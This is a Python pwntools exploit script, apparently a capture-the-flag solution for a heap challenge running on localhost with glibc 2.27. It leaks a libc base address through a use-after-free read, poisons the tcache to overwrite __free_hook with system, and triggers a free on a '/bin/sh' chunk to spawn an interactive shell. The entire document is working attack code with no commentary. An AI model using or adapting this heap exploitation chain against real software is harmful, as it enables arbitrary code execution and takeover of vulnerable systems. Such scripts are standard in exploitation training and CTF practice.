#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)

context(arch="amd64")
context(log_level="debug")

libc = ELF("./libc-2.27.so")

p = remote("127.0.0.1", 8888)

def add(idx, sz):
    p.sendlineafter(">", '1')
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(sz))
    
def free(idx):
    p.sendlineafter(">", '2')
    p.sendlineafter(":", str(idx))
    
def show(idx):
    p.sendlineafter(">", '3')
    p.sendlineafter(":", str(idx))

def edit(idx, ctx):
    p.sendlineafter(">", '4')
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", ctx)

add(0, 0x500)
add(1, 0x10)
add(2, 0x10)
add(3, 0x10)

free(0)
show(0)
p.recvuntil("Content: ")
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebca0
info("libcbase: 0x%lx", libc.address)

free(1)
free(2)
edit(2, p64(libc.symbols["__free_hook"]))

add(2, 0x10)
add(1, 0x10)

edit(1, p64(libc.symbols["system"]))
edit(3, b"/bin/sh\x00")

free(3)

p.interactive()
